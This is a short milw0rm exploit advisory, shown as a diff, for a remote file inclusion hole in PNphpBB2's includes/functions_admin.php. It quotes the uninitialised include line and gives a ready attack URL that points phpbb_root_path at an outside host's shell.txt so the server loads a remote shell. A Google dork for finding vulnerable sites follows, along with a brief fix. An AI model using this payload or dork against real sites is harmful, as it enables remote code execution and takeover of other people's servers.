@@ -1,0 +1,29 @@
+Yeah, another ZeroDay Smile
+
+Vendor: http://www.pnphpbb.com/
+
+Vulnerable File: includes/functions_admin.php
+
+Vulnerable Code:
+
+//The phpbb_root_path isn't initialize
+
+include_once( $phpbb_root_path . 'includes/functions.' . $phpEx );
+
+Method To Use:
+
+http://www.victim.com/[pn_phpbb]/includes/functions_admin.php?phpbb_root_path=http://yourdomain.com/shell.txt?
+
+How To Fix:
+
+Add this code before the include
+Code:
+if ( !defined('IN_PHPBB') )
+{
+   die("Hacking attempt");
+}
+
+
+Google Dork: Powered by PNphpBB2 / Powered por PNphpBB2
+
+# milw0rm.com [2006-09-18]
